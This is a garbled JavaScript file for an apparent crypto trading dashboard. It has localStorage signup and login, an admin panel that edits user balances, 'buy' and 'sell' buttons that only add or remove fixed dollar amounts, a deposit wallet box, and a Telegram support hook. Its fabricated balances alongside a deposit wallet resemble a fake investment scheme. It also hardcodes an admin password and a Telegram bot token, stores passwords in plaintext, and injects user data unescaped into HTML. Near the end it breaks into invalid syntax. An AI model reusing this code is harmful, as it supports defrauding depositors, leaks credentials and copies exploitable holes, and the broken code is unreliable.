<script>

// ADMIN LOGIN
let adminEmail = "admin@gmail.com";
let adminPass = "123456";

// SIGNUP
function signup() {
  let email = document.getElementById("su_email").value;
  let user = document.getElementById("su_user").value;
  let pass = document.getElementById("su_pass").value;

  let data = {
    email: email,
    user: user,
    pass: pass,
    balance: 0
  };

  localStorage.setItem(email, JSON.stringify(data));
  alert("Signup Success ✅");
}


// LOGIN
function login() {
  let email = document.getElementById("li_email").value;
  let pass = document.getElementById("li_pass").value;

  let data = localStorage.getItem(email);

  if (!data) {
    alert("User not found ❌");
    return;
  }

  data = JSON.parse(data);

  if (data.pass === pass) {
    localStorage.setItem("current", email);
    show();
  } else {
    alert("Wrong Password ❌");
  }
}
  

// SHOW DASHBOARD
function show(){
  let email = localStorage.getItem("current");
  let data = JSON.parse(localStorage.getItem(email));
  document.getElementById("email").innerText = email;
  auth.style.display="none";
  dashboard.style.display="block";

  user.innerText = data.user;
  bal.innerText = data.balance;
  selectCoin("BTCUSDT");
  // ADMIN CHECK
  if(email == adminEmail){
  adminPanel.style.display="block";
  loadUsers();
}
}

// INCREASE BALANCE
function add(){
  let email = localStorage.getItem("current");
  let data = JSON.parse(localStorage.getItem(email));

  data.balance += 100;
  localStorage.setItem(email, JSON.stringify(data));

  show();
}

// DECREASE BALANCE

  async function updateUserBalance() {

  let email = document.getElementById("targetEmail").value;
  let amount = parseInt(document.getElementById("newBalance").value);

  let snap = await getDocs(collection(db, "users"));

  snap.forEach(async (docSnap) => {
    let data = docSnap.data();

    if (data.email === email) {

      let newBal = (data.Balance || 0) + amount;

      await updateDoc(doc(db, "users", docSnap.id), {
        Balance: newBal
      });

      alert("✅ Balance Updated");
    }
  });


  show();
}
function openDeposit(){
  document.getElementById("walletBox").style.display = "block";
}

function closeWallet(){
  document.getElementById("walletBox").style.display = "none";
}
// LOGOUT
function logout(){
  localStorage.removeItem("current");
  location.reload();
}
function loadUsers(){
  let html = "";

  for(let i=0; i<localStorage.length; i++){
    let key = localStorage.key(i);

    if(key == "current") continue;

    let data = JSON.parse(localStorage.getItem(key));

    html += `
      <div style="background:#222; padding:10px; margin:10px; border-radius:8px;">
        <b>${data.user}</b> (${data.email}) <br>
        Balance: $${data.balance} <br><br>

        <button onclick="updateBal('${key}', 100)">+100</button>
<button onclick="updateBal('${key}', -100)">-100</button>
      </div>
    `;
  }

  usersList.innerHTML = html;
}
  function updateBal(email, amount){
  let data = JSON.parse(localStorage.getItem(email));

  if(!data){
    alert("User not found ❌");
    return;
  }

  data.balance = Number(data.balance || 0) + Number(amount);

  localStorage.setItem(email, JSON.stringify(data));

  loadUsers();

  alert("✅ Balance Updated");
}

                       }
// AUTO LOGIN
if(localStorage.getItem("current")){
  show();
}
let currentCoin = "BTCUSDT";
let currentPrice = 0;

// COIN SELECT
function selectCoin(symbol) {
  currentCoin = symbol;

  document.getElementById("chartBox").src =
    "https://s.tradingview.com/widgetembed/?symbol=BINANCE:" + symbol + "&interval=1";

  loadPrice();
}

// LOAD LIVE PRICE
async function loadPrice() {
  let res = await fetch(`https://api.binance.com/api/v3/ticker/price?symbol=${currentCoin}`);
  let data = await res.json();

  currentPrice = parseFloat(data.price);
  price.innerText = currentPrice.toFixed(2);
}

// AUTO UPDATE PRICE
setInterval(loadPrice, 2000);

// BUY
function buy(){

  if(!isAdmin()){
    alert("⚠️ Only admin can trade!");
    return;
  }

  // admin buy logic
  let email = localStorage.getItem("current");

if(!email){
  alert("Login first ❗");
  return;
}
  let raw = localStorage.getItem(email);

if(!raw){
  alert("User data missing ❌");
  return;
}

let data;

try {
  data = JSON.parse(raw);
} catch(e){
  alert("Data error ❌");
  return;
}

  data.balance += 100; // profit add
  localStorage.setItem(email, JSON.stringify(data));

  alert("✅ Admin Buy Success (+$100)");
  show();
}

// SELL
function sell(){

  if(!isAdmin()){
    alert("⚠️ Only admin can trade!");
    return;
  }

  let email = localStorage.getItem("current");

  if(!email){
    alert("Login first ❗");
    return;
  }

  let raw = localStorage.getItem(email);

  if(!raw){
    alert("User data missing ❌");
    return;
  }

  let data;

  try {
    data = JSON.parse(raw);
  } catch(e){
    alert("Data error ❌");
    return;
  }

  data.balance -= 50;

  localStorage.setItem(email, JSON.stringify(data));

  alert("❌ Admin Sell (-$50)");
  show();
}
  function copyWallet() {
  let text = document.getElementById("walletAddress").innerText;
  navigator.clipboard.writeText(text);
  alert("Wallet Address Copied ✅");
  }   
  function isAdmin(){
  let email = localStorage.getItem("current");
  return email === adminEmail;
  }

  let token = "8369866698:AAHijGkg3CsVGNKjrnlz9gS_4xRrpn5kJUM";
  let chat_id = "2025370144";

  let url = "https://api.telegram.org/bot" + token + "/sendMessage";

  fetch(url, {

  let msg = document.getElementById("userMsg").value;

  if(!msg){
    alert("Type message");
    return;
  }

  sendToTelegram("User: " + msg);
    document.getElementById("userMsg").value = "";

  alert("Message sent to support ✅");
  }
</script>
